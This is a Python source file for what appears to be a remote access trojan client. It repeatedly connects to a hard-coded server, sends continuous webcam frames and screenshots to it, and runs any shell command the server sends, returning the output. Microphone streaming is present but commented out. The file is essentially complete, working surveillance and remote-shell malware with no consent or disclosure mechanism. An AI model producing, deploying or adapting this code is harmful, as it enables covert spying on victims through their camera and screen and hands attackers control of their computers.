import tkinter as tk
import socket
import pickle
import struct
import numpy
import time
import cv2
import io
import subprocess

from threading import Thread
from PIL import ImageGrab


class Client:
    def __init__(self):
        self.client = None

        self.frame = None
        self.audio = None
        self.frameDump = None
        self.framePack = None
        self.cam_thread = None
        self.screen_thread = None

        self.stream_cam_enabled = True
        self.close_thread = False

        self.root = tk.Tk()
        self.screen_size = [self.root.winfo_screenwidth(), self.root.winfo_screenheight()]

        #self.micro_thread = None

        self.connectClient()

    def connectClient(self):
        while True:
            print("Attempting to connect to server...")
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.connect(("192.168.15.3", 4000))

                print("Connected to server")

                self.stream_cam_enabled = True
                self.close_thread = False

                #self.micro_thread = Thread(target=self.getMicrophoneStream, args=())
                self.cam_thread = Thread(target=self.getCamStream, args=())
                self.screen_thread = Thread(target=self.getScreen, args=())

                self.cam_thread.start()
                self.screen_thread.start()

                self.processData()

            except Exception as err:
                print(err)

                self.client.close()
                self.client = None

                time.sleep(5)
                continue
    
    def sendAll(self, data):
        try:
            self.client.sendall(data)

        except Exception as err:
            self.close_thread = True 
            print(err)
            return None

    def receiveAll(self):
        try:
            data = self.client.recv(1024)
            return data
            
        except:
            self.close_thread = True
            return None

    """
    def getMicrophoneStream(self):
        while True:
            if not self.stream_cam_enabled:
                continue
            
            if self.close_thread:
                break

            try:
                data = stream.read(1024)
                mic_buff = numpy.frombuffer(data, dtype=numpy.int16)
                microData = mic_buff.astype(numpy.int16).tobytes()
                packet = [0x02, *microData]
                data = self.sendAll(bytes(packet))
            except:
                continue

            if data == None:
                continue
    """


    def getScreen(self):
        while True:
            if not self.stream_cam_enabled or self.close_thread:
                break 

            img = ImageGrab.grab()
            compressed_image = io.BytesIO()
            img.save(compressed_image, format="JPEG", quality=90)

            frameDump = compressed_image.getvalue()
            dump_len = len(frameDump)

            len_frame = [(dump_len >> 16) & 0xff, (dump_len >> 8) & 0xff, dump_len & 0xff]

            self.sendAll(bytes([0x03, *len_frame]) + frameDump)

    def getCamStream(self):
        while True:
            if not self.stream_cam_enabled or self.close_thread:
                break 

            try:
                cap = cv2.VideoCapture(0)
                while self.stream_cam_enabled:
                    if self.close_thread:
                        break

                    ret, frame = cap.read()
                    if not ret or frame is None:
                        time.sleep(0.05)
                        continue

                    self.sendFrame(0x01, frame)
                    time.sleep(0.03)

                cap.release()
            except Exception as err:
                print("No camera detected")
                time.sleep(0.5)

        return None

    def commandProcess(self):
        while True:
            if self.close_thread:
                break

            try:
                self.data = self.receiveAll().decode()

                if self.data != "cmd_packet":
                    sys = subprocess.Popen(self.data, shell=True,stdout=subprocess.PIPE)
                    output = sys.stdout.read()
                    print(self.data)

                    len_msg = [len(output) >> 16 & 0xff, len(output) >> 8 & 0xff, len(output) & 0xff]

                    self.sendAll(bytes([0x04, *len_msg, *output]))

                    break

            except Exception as err:
                print(err)
                return None

    def processData(self):
        while True:
            if self.close_thread:
                break

            try:
                data = self.receiveAll().decode()
            except:
                continue

            if data == None:
                continue

            if data == "cmd_packet":
                self.commandProcess()

if __name__ == "__main__":
    Client()